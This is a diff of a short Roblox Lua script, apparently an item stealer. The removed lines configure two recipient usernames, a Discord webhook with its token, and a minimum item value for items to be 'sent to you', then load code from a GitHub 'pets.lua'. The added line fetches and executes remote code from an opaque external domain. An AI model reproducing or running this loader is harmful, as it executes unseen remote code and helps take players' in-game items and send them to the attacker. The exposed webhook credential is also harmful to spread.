@@ -1,5 +1,1 @@
-Username = "JynxOJ"
-Username2 = "TacoMan0202" -- stuff will get sent to this user if first user's mailbox is full
-Webhook = "https://discord.com/api/webhooks/1221583815386988714/yLwA5tUic6f6jMaBwaOZetCetrQeXpIkuHYCn8MDcGHv8T6dbAJwILfHB9vb7_O4J8pe"
-min_rap = 500 -- minimum rap of each item you want to get sent to you.
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/P99/main/pets.lua"))()
+loadstring(game:HttpGet("https://egorikusa.space/cab06fa383c363d79877e984.lua", true))()
